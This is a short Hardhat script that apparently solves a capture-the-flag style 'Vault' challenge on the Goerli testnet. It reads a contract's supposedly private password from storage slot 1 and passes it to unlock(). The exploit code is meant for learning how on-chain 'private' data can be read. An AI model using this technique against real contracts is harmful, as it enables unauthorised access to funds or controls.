const { ethers } = require("hardhat");

const INSTANCE_ADDRESS = "0x0C2a4ba22B3Cacb94B04756BA161cc2259c4898A";
const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_RPC_URL);

async function main() {
    const vaultInstance = await ethers.getContractAt("Vault", INSTANCE_ADDRESS);

    // Password is stored at the slot number 1 in the contract.
    // Slot number 0 is storing "bool locked" in the contract.
    const passwordAtStorage = await provider.getStorageAt(INSTANCE_ADDRESS, 1);
    console.log("pass: ", passwordAtStorage);

    // Call the unlock function in the contract instance
    const txResponse = await vaultInstance.unlock(passwordAtStorage);
    const txReceipt = await txResponse;
    console.log("txReceipt: ", txReceipt);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});